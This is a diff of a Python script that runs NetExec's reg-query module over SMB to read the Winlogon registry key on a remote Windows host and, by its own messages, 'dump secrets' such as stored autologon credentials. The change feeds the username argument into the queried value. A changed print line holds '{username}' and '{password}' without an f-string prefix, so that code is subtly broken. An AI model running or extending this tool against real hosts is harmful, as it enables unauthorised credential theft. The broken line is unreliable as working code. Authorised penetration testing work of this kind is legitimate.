@@ -30,10 +30,9 @@ def run_nxc_query(target, username, password, domain, protocol='smb', nxc_path='
     # CORRECTED SYNTAX: The reg-query module options are passed as a single string
     # to the -o flag. The key is 'KEY' and the value is 'VALUE'.
     key_path = r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
-    value_name = 'Administrator'
     
     # Construct the module options string
-    module_options = f"KEY='{key_path}' VALUE={value_name}"
+    module_options = f"KEY='{key_path}' VALUE={username}"
 
     # Construct the full command as a list for safe execution
     command = [
@@ -50,7 +49,7 @@ def run_nxc_query(target, username, password, domain, protocol='smb', nxc_path='
     ]
 
     try:
-        print(f"[*] Executing command to query for '{value_name}' and dump secrets...")
+        print(f"[*] Executing command to query for '{username}' and dump secrets...")
         # For debugging: print the exact command that will be run
         # print(f"[*] Command: {' '.join(command)}")
         
@@ -71,7 +70,7 @@ def run_nxc_query(target, username, password, domain, protocol='smb', nxc_path='
         # Check the return code to determine success or failure.
         if result.returncode == 0:
             print("[+] NetExec command completed successfully.")
-            print("[+] Check the output above for 'DefaultUsername', 'DefaultPassword', and other secrets.")
+            print("[+] Check the output above for '{username}', '{password}', and other secrets.")
         else:
             print(f"[-] NetExec command failed with exit code {result.returncode}.")
             print("[-] This could be due to authentication failure, network issues, or permissions.")
